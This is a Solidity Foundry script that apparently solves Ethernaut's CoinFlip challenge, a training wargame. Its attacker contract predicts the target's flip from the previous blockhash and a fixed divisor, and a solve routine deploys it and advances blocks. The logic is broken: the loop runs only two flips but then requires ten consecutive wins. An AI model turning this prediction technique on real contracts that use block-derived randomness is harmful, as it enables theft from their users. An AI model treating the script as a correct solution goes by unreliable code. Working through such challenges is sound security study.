pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip coin;

    constructor(ICoinFlip _coin) {
        coin = _coin;
    }

    function guessAndFlip() external {
        coin.flip(guess());
    }

    function guess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}

contract Ethernaut03 is EthernautTest {
    function setUp() public {
        initialize(address(0x4dF32584890A0026e56f7535d0f2C6486753624f));
    }

    function run() public {
        setUp();
        deploy();
        solve();
        submit(me);
    }

    function test() public {
        for (uint256 i = 0; i < 10; ++i) {
            vm.roll(block.number + 1);
            console.log(block.number);
            console.logBytes32(blockhash(block.number - 1));
        }
        // testMode = true;
        // deploy();
        // solve();
        // submit(me);
    }

    function solve() internal {
        broadcastOrPrank();
        CoinFlipAttacker attacker = new CoinFlipAttacker(ICoinFlip(instance));

        for (uint256 i = 0; i < 2; ++i) {
            console.log(block.number);
            broadcastOrPrank();
            attacker.guessAndFlip();
            console.log(block.number);

            vm.roll(block.number + 1);
        }

        require(ICoinFlip(instance).consecutiveWins() == 10, "not won");
    }
}
